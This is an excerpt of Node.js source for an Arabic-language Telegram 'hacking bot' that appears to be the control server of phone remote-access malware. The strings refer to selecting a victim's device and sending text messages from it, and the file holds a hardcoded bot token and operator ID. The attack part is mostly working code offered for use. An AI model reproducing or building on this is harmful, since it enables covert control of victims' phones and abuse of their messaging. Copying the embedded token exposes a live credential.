...
const token = '8537127166:AAFD3c3LbYInCoqonzGcF5sAUGFnlr0Rl_M'
const id = '6605203447'
...
app.get('/', function (req, res) {
    res.send('<h1 align="center">تم تشغيل البوت بنجاح المطور الملك صقر</h1>')
})
...
appBot.on('message', (message) => {
    ...
    if (message.reply_to_message) {
        ...
        if (message.reply_to_message.text.includes('°• جيد الان قم بكتابة الرسالة المراد ارسالها من جهاز الضحية الئ الرقم الذي كتبتة قبل قليل....')) {
            ...
            appBot.sendMessage(id,
                ...
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور الملك صقر ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
    ...
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '°• مرحبا بكم في بوت الاختراق مطور البوت الملك صقر\n\n' +
                ...
                '• انقر على زر الأمر وحدد الجهاز المطلوب ثم حدد الأمر المطلوب بين الأمر المطور ابو ذياب @u_x86 قناة المطور https://t.me/+T_8QE67Pn6tkMzNk\n\n' +
